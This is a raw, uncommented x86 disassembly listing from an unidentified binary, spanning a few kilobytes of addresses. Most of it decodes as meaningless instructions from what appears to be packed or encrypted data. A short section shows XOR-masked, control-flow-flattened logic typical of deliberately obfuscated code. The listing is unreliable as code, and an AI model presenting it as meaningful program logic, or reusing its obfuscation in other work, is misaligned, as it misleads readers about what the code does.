  41e80f:	rcr    DWORD PTR [ecx+0x75ec6e64],cl
  41e815:	mul    BYTE PTR [esi+ebx*1+0x11]
  41e819:	sbb    DWORD PTR [eax+0x695da177],edx
  41e81f:	fld    DWORD PTR ds:0xffa86e29
  41e825:	mov    ?,ebp
  41e827:	sti    
  41e828:	or     DWORD PTR [ecx+0x5afcc2dd],0x9
  41e82f:	xchg   esp,eax
  41e830:	nop
  41e831:	movups xmm2,XMMWORD PTR [eax]
  41e834:	loopne 0x41e85d
  41e836:	xchg   sp,ax
  41e838:	aas    
  41e839:	outs   dx,DWORD PTR ds:[esi]
  41e83a:	pop    ecx
  41e83b:	call   0x8340:0xc1537f01
  41e842:	jge    0x41e86f
  41e844:	xor    BYTE PTR [eax+eax*2],bl
  41e847:	mov    BYTE PTR [esp],bh
  41e84a:	icebp  
  41e84b:	aad    0x1a
  41e84d:	add    eax,0xeb0a9e7
  41e852:	out    0xcc,eax
  41e854:	dec    esi
  41e855:	mov    ds,WORD PTR [eax-0x51]
  41e858:	imul   esi,esp,0x90cc7c4
  41e85e:	call   0x683d:0x70369f76
  41e865:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e866:	add    al,0xf7
  41e868:	xchg   edx,eax
  41e869:	push   cs
  41e86a:	sub    DWORD PTR [eax-0x197ee3cd],0xd37c72ca
  41e874:	mov    ah,0xc9
  41e876:	cmp    al,0xf4
  41e878:	sbb    edi,DWORD PTR [esi]
  41e87a:	inc    edx
  41e87b:	jnp    0x41e80d
  41e87d:	mov    al,ds:0x1905ed91
  41e882:	enter  0xec68,0x9d
  41e886:	jb     0x41e88d
  41e888:	leave  
  41e889:	xchg   esp,eax
  41e88a:	rcl    BYTE PTR [ecx+ebp*1+0x1416207c],cl
  41e891:	in     eax,dx
  41e892:	in     al,0xcc
  41e894:	fbld   TBYTE PTR [ebx+ecx*1]
  41e897:	jecxz  0x41e89a
  41e899:	pop    esp
  41e89a:	dec    esi
  41e89b:	adc    edi,DWORD PTR [ebx]
  41e89d:	push   DWORD PTR [eax+ebp*2-0x60]
  41e8a1:	dec    esi
  41e8a2:	(bad)  [ecx-0x35e53466]
  41e8a8:	into   
  41e8a9:	ins    DWORD PTR es:[edi],dx
  41e8aa:	push   edi
  41e8ab:	xor    DWORD PTR [esi-0x57],edx
  41e8ae:	mov    WORD PTR [edx-0x3cfdea28],gs
  41e8b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8b5:	sti    
  41e8b6:	add    edx,DWORD PTR [esi]
  41e8b8:	jbe    0x41e83c
  41e8ba:	jo     0x41e84a
  41e8bc:	mov    edi,0x70ef2ee1
  41e8c1:	adc    DWORD PTR [ebx],ecx
  41e8c3:	xchg   edx,eax
  41e8c4:	clc    
  41e8c5:	xor    edi,DWORD PTR gs:[ecx]
  41e8c8:	cmp    ecx,DWORD PTR [edx+0xb0e3f8]
  41e8ce:	ret    
  41e8cf:	cmc    
  41e8d0:	pop    esi
  41e8d1:	in     al,dx
  41e8d2:	pop    ebx
  41e8d3:	(bad)  
  41e8d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8d5:	jl     0x41e8e5
  41e8d7:	fild   QWORD PTR [esi+0x3]
  41e8da:	popf   
  41e8db:	pop    ds
  41e8dc:	mov    dl,0x5
  41e8de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8df:	pop    edi
  41e8e0:	mov    esp,0x5dd8c346
  41e8e5:	aad    0xbc
  41e8e7:	add    DWORD PTR [ebx],ebx
  41e8e9:	cdq    
  41e8ea:	adc    al,0xa8
  41e8ec:	ficom  WORD PTR [edx]
  41e8ee:	pop    es
  41e8ef:	adc    ch,ah
  41e8f1:	in     al,dx
  41e8f2:	xchg   ebp,eax
  41e8f3:	jp     0x41e946
  41e8f5:	ja     0x41e956
  41e8f7:	ret    0xe46a
  41e8fa:	cld    
  41e8fb:	(bad)  
  41e8fd:	mov    edx,0x2c4b0eec
  41e902:	lods   al,BYTE PTR ds:[esi]
  41e903:	inc    eax
  41e904:	pop    esp
  41e905:	push   cs
  41e906:	jne    0x41e8e1
  41e908:	pushf  
  41e909:	(bad)  
  41e90a:	mov    ebx,0xabf6d807
  41e90f:	les    ebp,FWORD PTR [edx-0x346016e7]
  41e915:	cmp    al,0x1
  41e917:	mov    ch,0x29
  41e919:	es aam 0x62
  41e91c:	int    0x6
  41e91e:	(bad)  
  41e91f:	cmp    BYTE PTR [edx],bl
  41e921:	jnp    0x41e91d
  41e923:	mov    eax,ds:0x257320d7
  41e928:	sahf   
  41e929:	push   es
  41e92a:	jno    0x41e94e
  41e92c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e92d:	dec    esi
  41e92e:	hlt    
  41e92f:	iret   
  41e930:	or     bh,cl
  41e932:	and    ch,al
  41e934:	push   edx
  41e935:	shr    BYTE PTR [ecx],cl
  41e937:	xchg   dh,bl
  41e939:	bound  ebx,QWORD PTR [edx+ebx*4]
  41e93c:	imul   edi,ecx,0x9
  41e93f:	(bad)  
  41e940:	jge    0x41e961
  41e942:	fmul   QWORD PTR [ebp-0x75]
  41e945:	dec    esi
  41e946:	adc    bl,BYTE PTR ds:0x311e8896
  41e94c:	pop    ebp
  41e94d:	mov    es,WORD PTR [ecx-0x3ad0be86]
  41e953:	pop    ebx
  41e954:	dec    eax
  41e955:	cmp    eax,0xa3995d87
  41e95a:	sahf   
  41e95b:	inc    edx
  41e95c:	mov    bl,0x79
  41e95e:	add    DWORD PTR [edx+0x6163e5da],eax
  41e964:	mov    ah,0x5f
  41e966:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e967:	inc    ebx
  41e968:	(bad)  
  41e96b:	mov    esp,0x94520b28
  41e970:	out    0x63,eax
  41e972:	cmp    DWORD PTR [eax-0x3b],ebp
  41e975:	ror    DWORD PTR [ebx],0xc8
  41e978:	dec    edx
  41e979:	or     esp,DWORD PTR [ebx+0x44b1fe7a]
  41e97f:	inc    eax
  41e980:	hlt    
  41e981:	fdivp  st(1),st
  41e983:	bnd jno 0x41e958
  41e986:	(bad)  
  41e987:	jae    0x41e988
  41e989:	mov    ds:0x8ef2b80e,eax
  41e98e:	pop    ecx
  41e98f:	xor    esp,DWORD PTR ds:0x8194f4ec
  41e995:	mul    eax
  41e997:	aad    0x91
  41e999:	add    DWORD PTR [ebx+0x1],esp
  41e99c:	dec    edi
  41e99d:	xor    ebx,DWORD PTR [edx]
  41e99f:	lods   al,BYTE PTR ds:[esi]
  41e9a0:	pop    es
  41e9a1:	fsub   DWORD PTR [ebp-0x33]
  41e9a4:	jmp    0xb8cf:0x12dd547f
  41e9ab:	sbb    al,0x79
  41e9ad:	jge    0x41e9f4
  41e9af:	cmp    eax,0x19e1e4bc
  41e9b4:	pop    edx
  41e9b5:	mov    ch,0x15
  41e9b7:	jp     0x41e980
  41e9b9:	mov    ebp,0xe9e9f499
  41e9be:	add    al,BYTE PTR [ebx]
  41e9c0:	jae    0x41ea13
  41e9c2:	fsubrp st(0),st
  41e9c4:	jne    0x41e99c
  41e9c6:	mov    al,0xe
  41e9c8:	ja     0x41ea18
  41e9ca:	and    ch,BYTE PTR [edx+edx*1-0x1f]
  41e9ce:	dec    eax
  41e9cf:	or     DWORD PTR [eax],edi
  41e9d1:	adc    esp,edx
  41e9d3:	pusha  
  41e9d4:	popf   
  41e9d5:	and    edi,eax
  41e9d7:	mov    ecx,DWORD PTR [ebx-0x2b2ad1d1]
  41e9dd:	sbb    bh,cl
  41e9df:	retf   0x8e21
  41e9e2:	popf   
  41e9e3:	stc    
  41e9e4:	adc    esp,esp
  41e9e6:	inc    ebx
  41e9e7:	sub    DWORD PTR [eax+0x5371313e],edi
  41e9ed:	icebp  
  41e9ee:	inc    ebp
  41e9ef:	push   ss
  41e9f0:	or     esp,DWORD PTR [ebx]
  41e9f2:	sbb    dh,al
  41e9f4:	mov    ch,0xc4
  41e9f6:	and    DWORD PTR [ebp-0x15f3e678],ebp
  41e9fc:	outs   dx,BYTE PTR ds:[esi]
  41e9fd:	xchg   DWORD PTR [edx-0x6a],edx
  41ea00:	pop    es
  41ea01:	in     al,dx
  41ea02:	mov    ds:0xa8591d5d,eax
  41ea07:	sbb    ecx,ebx
  41ea09:	lods   eax,DWORD PTR ds:[esi]
  41ea0a:	(bad)  
  41ea0b:	popa   
  41ea0c:	lods   al,BYTE PTR ds:[esi]
  41ea0d:	or     DWORD PTR [edi+0x63],esi
  41ea10:	and    al,bl
  41ea12:	sub    BYTE PTR fs:[edi+0x6a],ch
  41ea16:	adc    al,0xc
  41ea18:	es push ss
  41ea1a:	sahf   
  41ea1b:	popf   
  41ea1c:	clc    
  41ea1d:	and    ah,BYTE PTR [edx+ecx*8+0x78]
  41ea21:	enter  0xc94d,0xad
  41ea25:	cmp    esp,0xf7ca4bbe
  41ea2b:	jmp    0x320976ed
  41ea30:	test   eax,0x8726bf4a
  41ea35:	icebp  
  41ea36:	sti    
  41ea37:	test   eax,0x799aa472
  41ea3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea3d:	repz xchg ecx,eax
  41ea3f:	push   ebp
  41ea40:	jbe    0x41ea98
  41ea42:	lds    eax,FWORD PTR [edi-0x5d]
  41ea45:	test   al,0xb3
  41ea47:	jae    0x41ea70
  41ea49:	rcr    DWORD PTR [ebp+edx*2-0x1d],cl
  41ea4d:	xchg   ebx,eax
  41ea4e:	call   0x8958:0x3157876
  41ea55:	fstp   TBYTE PTR [ecx-0x61d7073e]
  41ea5b:	addr16 je 0x41ea68
  41ea5e:	leave  
  41ea5f:	xor    al,0x7e
  41ea61:	dec    eax
  41ea62:	mov    cl,ah
  41ea64:	loop   0x41ea50
  41ea66:	loop   0x41eade
  41ea68:	push   edi
  41ea69:	popa   
  41ea6a:	imul   eax,DWORD PTR [esi-0x77],0x48
  41ea6e:	pop    edi
  41ea6f:	(bad)  
  41ea70:	iret   
  41ea71:	adc    ah,BYTE PTR [edx]
  41ea73:	xchg   esp,eax
  41ea74:	fdivr  DWORD PTR [esi-0x35]
  41ea77:	in     al,dx
  41ea78:	pminub mm1,QWORD PTR [edi]
  41ea7b:	(bad)  
  41ea7c:	mov    bl,0x6e
  41ea7e:	and    BYTE PTR [eax+0x675317a3],al
  41ea84:	mov    cl,0xe4
  41ea86:	sub    BYTE PTR [eax-0x33],al
  41ea89:	adc    al,BYTE PTR [ebx+0x6183b7cb]
  41ea8f:	pop    edx
  41ea90:	sbb    DWORD PTR [ecx+0xb],edx
  41ea93:	ret    
  41ea94:	out    dx,eax
  41ea95:	push   ecx
  41ea96:	push   0x30db88fc
  41ea9b:	mov    eax,ds:0x98dbaebf
  41eaa0:	out    0x61,al
  41eaa2:	mov    ecx,0x589519c2
  41eaa7:	outs   dx,DWORD PTR ds:[esi]
  41eaa8:	adc    BYTE PTR [edi+0x61861ede],cl
  41eaae:	inc    ebp
  41eaaf:	mov    esp,ebx
  41eab1:	das    
  41eab2:	popf   
  41eab3:	inc    edi
  41eab4:	(bad)  
  41eab6:	push   cs
  41eab7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eab8:	test   al,0x23
  41eaba:	and    DWORD PTR [ebx],edx
  41eabc:	inc    edi
  41eabd:	pop    edx
  41eabe:	test   eax,0x40c88184
  41eac3:	jo     0x41eaa9
  41eac5:	inc    ebp
  41eac6:	xor    BYTE PTR [esi-0x24929695],ah
  41eacc:	pop    esi
  41eacd:	pop    esi
  41eace:	cdq    
  41eacf:	adc    cl,BYTE PTR [edx-0x69]
  41ead2:	dec    eax
  41ead3:	loopne 0x41eb4c
  41ead5:	mov    ah,0x9a
  41ead7:	add    edx,edx
  41ead9:	xor    BYTE PTR [eax-0x122900b5],0xb2
  41eae0:	inc    eax
  41eae1:	pop    eax
  41eae2:	xchg   esi,eax
  41eae3:	cld    
  41eae4:	dec    edx
  41eae5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eae6:	sub    al,0x5
  41eae8:	inc    edx
  41eae9:	or     ah,BYTE PTR [esi]
  41eaeb:	ins    DWORD PTR es:[edi],dx
  41eaec:	push   ebp
  41eaed:	fisubr WORD PTR [edi+0xf]
  41eaf0:	mov    eax,ds:0x8e67ce20
  41eaf5:	rcl    BYTE PTR [edx-0x43785434],cl
  41eafb:	push   es
  41eafc:	inc    ecx
  41eafd:	clc    
  41eafe:	enter  0x2a21,0x32
  41eb02:	pop    ecx
  41eb03:	mov    ebp,0x2413f483
  41eb08:	shr    DWORD PTR ds:0x52eba42,0xdd
  41eb0f:	imul   ebx,DWORD PTR [ebx+0x36400fa],0xffffffea
  41eb16:	cli    
  41eb17:	loopne 0x41eb75
  41eb19:	pop    ecx
  41eb1a:	mov    ebp,0xf54ab2cf
  41eb1f:	test   eax,0x7a7a95ac
  41eb24:	in     eax,0x3
  41eb26:	jb     0x41eaab
  41eb28:	es cwde 
  41eb2a:	mov    dh,BYTE PTR [ebx+edx*1+0x22]
  41eb2e:	xor    edi,DWORD PTR [esi-0x5cdfdc21]
  41eb34:	xchg   esi,eax
  41eb35:	pushf  
  41eb36:	xor    BYTE PTR [esi-0x1a0b648],0xc2
  41eb3d:	out    0x5a,al
  41eb3f:	out    dx,al
  41eb40:	cmp    cl,BYTE PTR [edi+ebx*1+0x28]
  41eb44:	fcomp  QWORD PTR cs:[edi]
  41eb47:	sbb    eax,0xede4dfe5
  41eb4c:	into   
  41eb4d:	cli    
  41eb4e:	test   eax,0x33e7ad3a
  41eb53:	repz (bad) 
  41eb55:	fcomp  DWORD PTR [edi+ebx*8]
  41eb58:	mov    esp,0x68e684b3
  41eb5d:	ja     0x41eb43
  41eb5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb60:	(bad)  
  41eb61:	jmp    0xc52c:0x93f08d44
  41eb68:	adc    al,0xb7
  41eb6a:	xlat   BYTE PTR ds:[ebx]
  41eb6b:	iret   
  41eb6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb6d:	cdq    
  41eb6e:	jmp    0x4c92aac7
  41eb73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb74:	call   0x932c60b9
  41eb79:	inc    BYTE PTR [eax+0x1f6a5c4e]
  41eb7f:	add    esi,DWORD PTR [eax+0x63f337f0]
  41eb85:	fdiv   st,st(1)
  41eb87:	ins    DWORD PTR es:[edi],dx
  41eb88:	push   ebx
  41eb89:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41eb8b:	jo     0x41eb12
  41eb8d:	mov    esp,DWORD PTR [ebx+0x176e6206]
  41eb93:	or     cl,BYTE PTR [edx+0x27]
  41eb96:	out    0xbf,eax
  41eb98:	jp     0x41eb8f
  41eb9a:	sbb    eax,0x504971e4
  41eb9f:	in     eax,0x32
  41eba1:	xor    al,0x1b
  41eba3:	or     BYTE PTR [edi-0x36f8f80c],ch
  41eba9:	(bad)  
  41ebab:	leave  
  41ebac:	aam    0xe0
  41ebae:	ret    0xbea3
  41ebb1:	cmp    BYTE PTR [ebx-0x10],al
  41ebb4:	pushf  
  41ebb5:	pusha  
  41ebb6:	inc    ebp
  41ebb7:	rol    BYTE PTR [ebx],cl
  41ebb9:	xchg   ebp,eax
  41ebba:	xor    cl,dh
  41ebbc:	xchg   esp,esi
  41ebbe:	or     ecx,esp
  41ebc0:	inc    esi
  41ebc1:	iret   
  41ebc2:	lods   al,BYTE PTR ds:[esi]
  41ebc3:	sub    ebx,DWORD PTR [esi-0x7c4f766d]
  41ebc9:	test   BYTE PTR [edx+0x2bba2799],ch
  41ebcf:	xchg   DWORD PTR [edx+0x64c82648],esp
  41ebd5:	les    esp,FWORD PTR [ebx+0x1b]
  41ebd8:	dec    ebx
  41ebd9:	leave  
  41ebda:	add    dl,BYTE PTR [ecx+0x4e2c0c27]
  41ebe0:	jbe    0x41ec2e
  41ebe2:	add    eax,0xfc6ef308
  41ebe7:	imul   eax,DWORD PTR [eax+0x43],0x17
  41ebeb:	jp     0x41ec61
  41ebed:	dec    edx
  41ebee:	in     eax,dx
  41ebef:	imul   esp,DWORD PTR [edi],0x42ee2625
  41ebf5:	xchg   BYTE PTR [ebp-0x78491d8a],ch
  41ebfb:	xchg   edx,eax
  41ebfc:	adc    al,0x64
  41ebfe:	jl     0x41ec2a
  41ec00:	int3   
  41ec01:	hlt    
  41ec02:	jne    0x41ec3b
  41ec04:	adc    BYTE PTR [ebx],ah
  41ec06:	inc    edx
  41ec07:	and    eax,0x7cd54873
  41ec0c:	add    eax,0x4728ff23
  41ec11:	out    0xb5,eax
  41ec13:	fs stos DWORD PTR es:[edi],eax
  41ec15:	jne    0x41eb99
  41ec17:	mov    ch,0x9f
  41ec19:	sysexit 
  41ec1b:	jecxz  0x41ec51
  41ec1d:	add    al,dh
  41ec1f:	clc    
  41ec20:	imul   ebp,esp,0xd26b73bb
  41ec26:	retf   0xc49c
  41ec29:	and    dl,BYTE PTR [esi-0x67]
  41ec2c:	arpl   WORD PTR [ebp-0x6a7ff7b8],sp
  41ec32:	aad    0x18
  41ec34:	inc    ecx
  41ec35:	pop    ebx
  41ec36:	push   cs
  41ec37:	inc    esp
  41ec38:	adc    al,0x3d
  41ec3a:	push   ebp
  41ec3b:	ins    BYTE PTR es:[edi],dx
  41ec3c:	repz out dx,al
  41ec3e:	pop    ebp
  41ec3f:	ret    
  41ec40:	dec    esp
  41ec41:	xchg   edi,eax
  41ec42:	and    DWORD PTR [ebx],ebx
  41ec44:	clc    
  41ec45:	jecxz  0x41ebd8
  41ec47:	xchg   edx,eax
  41ec48:	adc    DWORD PTR [edx-0x3e],0x775555d0
  41ec4f:	cmp    DWORD PTR [edx+0x43b61db3],esi
  41ec55:	mov    ebx,0x48e6cc85
  41ec5a:	cmp    eax,0x9a215d0a
  41ec5f:	ret    0x6af7
  41ec62:	adc    dh,bh
  41ec64:	jne    0x41ec08
  41ec66:	in     eax,dx
  41ec67:	shr    DWORD PTR [eax-0x6b],0x2f
  41ec6b:	pop    esp
  41ec6c:	rol    DWORD PTR [edi+0x7a3b10c3],0x24
  41ec73:	inc    esp
  41ec74:	sub    BYTE PTR [ebx+edx*2+0x2599e60e],0x8e
  41ec7c:	add    ch,BYTE PTR gs:[eiz*1-0x60b313b6]
  41ec84:	push   es
  41ec85:	pop    eax
  41ec86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec87:	inc    ebp
  41ec88:	fwait
  41ec89:	xchg   esp,eax
  41ec8a:	lods   eax,DWORD PTR ds:[esi]
  41ec8b:	aaa    
  41ec8c:	lods   al,BYTE PTR ds:[esi]
  41ec8d:	ror    ah,1
  41ec8f:	mov    dh,0x90
  41ec91:	adc    DWORD PTR [esi-0x7e],esp
  41ec94:	rcl    BYTE PTR [edi+0x442cb78],0x76
  41ec9b:	retf   0xc061
  41ec9e:	xchg   edi,eax
  41ec9f:	jnp    0x41ecf4
  41eca1:	xchg   BYTE PTR [eax],dh
  41eca3:	pop    esi
  41eca4:	leave  
  41eca5:	jae    0x41ec35
  41eca7:	fsin   
  41eca9:	adc    al,0xfa
  41ecab:	int3   
  41ecac:	mov    eax,0xe1d8bcd
  41ecb1:	adc    DWORD PTR ds:[bx+di-0x53c2],edi
  41ecb7:	pop    eax
  41ecb8:	aaa    
  41ecb9:	add    eax,DWORD PTR [ebx+0x39285f17]
  41ecbf:	xchg   esi,eax
  41ecc0:	pop    ebx
  41ecc1:	ret    
  41ecc2:	loop   0x41ed1c
  41ecc4:	cwde   
  41ecc5:	mov    ah,0xf7
  41ecc7:	or     edx,DWORD PTR [ebx+0x7]
  41ecca:	pop    edx
  41eccb:	in     al,0x47
  41eccd:	jne    0x41ec57
  41eccf:	imul   ebx,DWORD PTR [eax+0x0],0xc18939cc
  41ecd6:	jb     0x41ed09
  41ecd8:	div    BYTE PTR [ecx+ebp*8-0x1c]
  41ecdc:	jne    0x41ecd2
  41ecde:	int    0x41
  41ece0:	sbb    ebp,edi
  41ece2:	js     0x41ecc0
  41ece4:	out    dx,al
  41ece5:	jo     0x41ed05
  41ece7:	sti    
  41ece8:	pop    ss
  41ece9:	sbb    BYTE PTR [edi],bh
  41eceb:	stos   DWORD PTR es:[edi],eax
  41ecec:	xchg   BYTE PTR [edi+edi*1],bl
  41ecef:	or     BYTE PTR [esp+ebx*8-0x1e],al
  41ecf3:	sub    ecx,esi
  41ecf5:	xor    ecx,eax
  41ecf7:	mov    DWORD PTR [ebp+0x8],ecx
  41ecfa:	mov    ecx,DWORD PTR [ebp+0x8]
  41ecfd:	mov    edx,DWORD PTR [ebp+0x8]
  41ed00:	imul   edx,edx,0x5708f5
  41ed06:	xor    ecx,eax
  41ed08:	add    ecx,esi
  41ed0a:	lea    ecx,[ebp+ecx*4-0x64]
  41ed0e:	mov    edi,DWORD PTR [ecx]
  41ed10:	add    edx,edi
  41ed12:	mov    DWORD PTR [ecx],edx
  41ed14:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed17:	xor    ecx,eax
  41ed19:	add    ecx,esi
  41ed1b:	jne    0x41c96c
  41ed21:	mov    ecx,DWORD PTR [ebp-0x8]
  41ed24:	mov    edx,DWORD PTR [ebp-0x20]
  41ed27:	xor    ecx,eax
  41ed29:	lea    ecx,[ecx+edx*1+0x3272db]
  41ed30:	mov    DWORD PTR [ebp-0x20],ecx
  41ed33:	inc    DWORD PTR [ebp+0xc]
  41ed36:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ed39:	xor    ecx,eax
  41ed3b:	add    ecx,esi
  41ed3d:	jne    0x41c71d
  41ed43:	jmp    0x421147
  41ed48:	mov    ecx,DWORD PTR [ebp-0xc]
  41ed4b:	mov    DWORD PTR [ebp+0x8],ecx
  41ed4e:	jmp    0x41ed80
  41ed53:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed56:	mov    edx,DWORD PTR [ebp-0x8]
  41ed59:	xor    ecx,eax
  41ed5b:	xor    edx,eax
  41ed5d:	sub    ecx,edx
  41ed5f:	sub    ecx,esi
  41ed61:	xor    ecx,eax
  41ed63:	mov    DWORD PTR [ebp+0x8],ecx
  41ed66:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed69:	mov    edx,DWORD PTR [ebp+0x8]
  41ed6c:	imul   edx,edx,0x5708f5
  41ed72:	xor    ecx,eax
  41ed74:	add    ecx,esi
  41ed76:	lea    ecx,[ebp+ecx*4-0x64]
  41ed7a:	mov    edi,DWORD PTR [ecx]
  41ed7c:	add    edx,edi
  41ed7e:	mov    DWORD PTR [ecx],edx
  41ed80:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed83:	xor    ecx,eax
  41ed85:	add    ecx,esi
  41ed87:	jne    0x41ed53
  41ed8d:	jmp    0x421153
  41ed92:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed95:	mov    edx,DWORD PTR [ebp-0x8]
  41ed98:	xor    ecx,eax
  41ed9a:	xor    edx,eax
  41ed9c:	sub    ecx,edx
  41ed9e:	sub    ecx,esi
  41eda0:	xor    ecx,eax
  41eda2:	mov    DWORD PTR [ebp+0x8],ecx
  41eda5:	mov    ecx,DWORD PTR [ebp+0x8]
  41eda8:	mov    edx,DWORD PTR [ebp+0x8]
  41edab:	xor    ecx,eax
  41edad:	imul   edx,edx,0x5708f5
  41edb3:	add    ecx,esi
  41edb5:	lea    ecx,[ebp+ecx*4-0x64]
  41edb9:	jmp    0x421134
  41edbe:	dec    ecx
  41edbf:	xor    eax,0xa7642764
  41edc4:	test   DWORD PTR [ebx],edx
  41edc6:	mov    esi,0x6ce70850
  41edcb:	pushf  
  41edcc:	sbb    BYTE PTR [ecx],dl
  41edce:	sbb    edx,0x61
  41edd1:	bound  eax,QWORD PTR [edi+ebx*2]
  41edd4:	bound  esp,QWORD PTR [edx+0x15]
  41edd7:	outs   dx,DWORD PTR ds:[esi]
  41edd8:	ins    BYTE PTR es:[edi],dx
  41edd9:	ret    0x9510
  41eddc:	cmp    DWORD PTR [edx+0x61],0xc0cf1833
  41ede3:	xchg   edx,eax
  41ede4:	int    0x13
  41ede6:	loopne 0x41edf7
  41ede8:	faddp  st(6),st
  41edea:	mov    dl,0xe7
  41edec:	pop    ebp
  41eded:	(bad)  
  41edee:	out    0x55,al
  41edf0:	in     al,dx
  41edf1:	add    al,0xb1
  41edf3:	dec    ecx
  41edf4:	xchg   ebx,eax
  41edf5:	and    eax,0xf1b9f67e
  41edfa:	gs mov ah,0x21
  41edfd:	dec    ebx
  41edfe:	cmp    eax,DWORD PTR [ecx+0x539e6cde]
  41ee04:	add    ebp,DWORD PTR [ebx+0x3f]
  41ee07:	sbb    DWORD PTR [ecx+0x2853cb92],ebx
  41ee0d:	sbb    BYTE PTR [esi],0x64
  41ee10:	adc    BYTE PTR [ebp+0x26],0xda
  41ee14:	fldenv [ebx]
  41ee16:	and    al,0x2f
  41ee18:	or     DWORD PTR [ecx+0x1b4bb5ff],edi
  41ee1e:	sbb    dl,BYTE PTR [esi-0x2b]
  41ee21:	xlat   BYTE PTR ds:[ebx]
  41ee22:	aaa    
  41ee23:	leave  
  41ee24:	fstp   TBYTE PTR [ebx]
  41ee26:	scas   al,BYTE PTR es:[edi]
  41ee27:	not    DWORD PTR [esi]
  41ee29:	inc    ebx
  41ee2a:	sti    
  41ee2b:	inc    ebp
  41ee2c:	(bad)  
  41ee2d:	xchg   ebp,eax
  41ee2e:	lods   al,BYTE PTR ds:[esi]
  41ee2f:	cmp    edi,DWORD PTR [edi-0x1b67b9e4]
  41ee35:	rcr    BYTE PTR [edi],cl
  41ee37:	add    cl,BYTE PTR [ebx+0x5cedce3c]
  41ee3d:	pop    edx
  41ee3e:	test   eax,0xdf499387
  41ee43:	dec    esp
  41ee44:	push   ebp
  41ee45:	into   
  41ee46:	xor    cl,ch
  41ee48:	push   es
  41ee49:	shl    bh,cl
  41ee4b:	sbb    DWORD PTR [ebp-0x7a90fc72],esp
  41ee51:	pop    ds
  41ee52:	ins    BYTE PTR es:[edi],dx
  41ee53:	jge    0x41ee43
  41ee55:	jecxz  0x41ee36
  41ee57:	lds    ebx,FWORD PTR [edi+0x34]
  41ee5a:	das    
  41ee5b:	icebp  
  41ee5c:	dec    edi
  41ee5d:	mov    bh,0xb
  41ee5f:	outs   dx,BYTE PTR ds:[esi]
  41ee60:	xchg   esp,eax
  41ee61:	xor    DWORD PTR [ebx],0xffffff99
  41ee64:	jns    0x41ee5d
  41ee66:	xchg   ebx,eax
  41ee67:	ja     0x41ee76
  41ee69:	(bad)  
  41ee6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee6b:	adc    dh,BYTE PTR [ebx]
  41ee6d:	iret   
  41ee6e:	sbb    DWORD PTR [edi-0x222c1bd8],0x1f
  41ee75:	jae    0x41ee07
  41ee77:	pop    ecx
  41ee78:	pushf  
  41ee79:	pop    ebx
  41ee7a:	shl    al,0x65
  41ee7d:	test   eax,0x40338adb
  41ee82:	outs   dx,DWORD PTR ds:[esi]
  41ee83:	mov    esi,0x9c22608c
  41ee88:	test   eax,0xeb848c34
  41ee8d:	pop    edx
  41ee8e:	jmp    0x41ee23
  41ee90:	xchg   ebp,eax
  41ee91:	push   es
  41ee92:	sahf   
  41ee93:	repnz out dx,eax
  41ee95:	mov    bl,0xcc
  41ee97:	sub    ebp,DWORD PTR [edi+0x39]
  41ee9a:	cld    
  41ee9b:	xor    BYTE PTR [ecx],0x2b
  41ee9e:	fwait
  41ee9f:	aad    0x5
  41eea1:	popa   
  41eea2:	dec    ebx
  41eea3:	push   eax
  41eea4:	loopne 0x41ef20
  41eea6:	pushf  
  41eea7:	sbb    eax,0xfaf1424b
  41eeac:	mov    eax,ds:0x2136df76
  41eeb1:	fcmovne st,st(5)
  41eeb3:	addr16 es cs inc ebp
  41eeb7:	inc    ebp
  41eeb8:	mov    ch,dh
  41eeba:	repnz and esp,DWORD PTR [ebx]
  41eebd:	dec    ebx
  41eebe:	nop
  41eebf:	(bad)  
  41eec0:	je     0x41ee9c
  41eec2:	mov    ebx,ebx
  41eec4:	push   ebp
  41eec5:	(bad)  
  41eec6:	xchg   esi,eax
  41eec7:	repz test DWORD PTR [ecx],edi
  41eeca:	mov    bl,0x6b
  41eecc:	jle    0x41ee87
  41eece:	in     al,dx
  41eecf:	popf   
  41eed0:	or     BYTE PTR [edi+0xd],bl
  41eed3:	cmp    eax,0xaa5d4bd1
  41eed8:	cmp    ebx,DWORD PTR [edx]
  41eeda:	shl    BYTE PTR [ecx-0x79],0xd2
  41eede:	mov    WORD PTR [edx+0x6f2e13c5],?
  41eee4:	mov    ch,0xc4
  41eee6:	or     cl,BYTE PTR [edi+0x5ef499fe]
  41eeec:	sub    DWORD PTR [eax],edi
  41eeee:	lds    esp,FWORD PTR fs:[ebx-0x1ff8924f]
  41eef5:	popa   
  41eef6:	or     ecx,esp
  41eef8:	dec    ebp
  41eef9:	popa   
  41eefa:	mov    edi,DWORD PTR fs:[esi+0x55]
  41eefe:	or     al,0x3d
  41ef00:	pop    ds
  41ef01:	and    BYTE PTR [ebx],bh
  41ef03:	mov    DWORD PTR [eax-0x78],esp
  41ef06:	les    ebx,FWORD PTR [eax+0x256adf33]
  41ef0c:	sub    BYTE PTR [edi+0x1f519854],bl
  41ef12:	test   eax,0xda62380b
  41ef17:	xor    al,0x46
  41ef19:	xchg   esp,eax
  41ef1a:	adc    ah,BYTE PTR [esi]
  41ef1c:	dec    edi
  41ef1d:	fsub   QWORD PTR [ebx+0x6c]
  41ef20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef21:	outs   dx,BYTE PTR ds:[esi]
  41ef22:	sbb    edi,DWORD PTR [ebx]
  41ef24:	leave  
